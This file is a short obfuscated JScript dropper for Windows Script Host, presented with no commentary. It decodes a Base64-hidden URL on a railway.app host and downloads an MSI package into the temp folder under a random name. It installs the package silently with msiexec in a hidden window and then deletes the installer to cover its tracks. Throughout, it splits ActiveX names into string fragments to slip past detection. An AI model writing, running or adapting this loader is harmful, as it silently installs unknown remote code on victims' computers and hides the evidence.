(function () {
    var B = "aHR0cHM6Ly9nZWtrb3NweS1uZXctcHJvZHVjdGlvbi51cC5yYWlsd2F5LmFwcC9tLzllODkwNjZkLWIyMWUtNDJhNi05ZDRiLWYyODMxNWRhYmFmNw==";
    var u = (function () {
        var enc = new ActiveXObject("Sys" + "tem.Text.ASCIIEncoding");
        var byt = new ActiveXObject("Sys" + "tem.Convert").FromBase64String(B);
        return enc.GetString(byt);
    })();

    var sh  = new ActiveXObject("WSc" + "ript.Shell");
    var fso = new ActiveXObject("Scrip" + "ting.FileSystemObject");
    var tmp = sh.ExpandEnvironmentStrings("%TEMP%");
    var nm  = "c" + Math.random().toString(36).substr(2, 8);
    var msi = tmp + "\\" + nm + ".msi";

    try {
        var h = new ActiveXObject("Win" + "Http.WinHttp" + "Request.5.1");
        h.Open("GET", u, false);
        h.SetRequestHeader("User-Agent", "Mozilla/5.0");
        h.Send();
        if (h.Status !== 200) throw 0;
        var s = new ActiveXObject("ADO" + "DB.Stream");
        s.Type = 1; s.Open(); s.Write(h.ResponseBody); s.SaveToFile(msi, 2); s.Close();
    } catch (e) { return; }

    try { sh.Run('msi' + 'exec /' + 'i "' + msi + '" /q' + 'n /nore' + 'start', 0, true); } catch (e2) { return; }

    try { fso.DeleteFile(msi, true); } catch (e3) {}
    try { sh.Run('cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "' + msi + '"', 0, true); } catch (e4) {}
})();
